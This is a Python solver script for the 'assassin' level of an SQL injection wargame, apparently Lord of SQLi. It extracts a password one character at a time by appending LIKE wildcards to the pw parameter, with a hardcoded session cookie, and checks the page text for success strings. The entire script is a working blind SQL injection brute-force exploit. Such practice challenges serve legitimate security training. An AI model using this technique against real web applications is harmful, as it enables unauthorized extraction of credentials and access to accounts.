import requests

cookies={'PHPSESSID':'360eo7qvee1nqqoi4v036s4f95'}

address="https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
url=address+"?pw="

boolean=True
while boolean:
    for a in range(48,123):
        turl=url+chr(a)
        res=requests.get(turl+"%",cookies=cookies)
        
        if "Hello guest" in res.text:
            url+=chr(a)
            print(chr(a)+"정답")
            break
        
        if "ASSASSIN Clear!" in res.text:
            print("clear : "+url+chr(a)+"%")
            boolean=False
            break
        else:
            print(chr(a)+"X")
